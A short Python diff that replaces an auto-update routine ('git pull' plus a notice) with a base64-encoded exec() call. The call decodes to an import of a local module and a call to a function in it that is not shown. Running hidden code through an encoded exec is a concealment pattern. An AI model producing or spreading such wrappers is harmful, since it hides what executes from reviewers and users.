@@ -1,4 +1,2 @@
-import os
-os.system("clear")
-os.system("git pull")
-print("\033[0;34mwait for new update!")
+import base64
+exec(base64.b64decode('aW1wb3J0IHRlc3QKdGVzdC5hemltdmF1KCkK'))
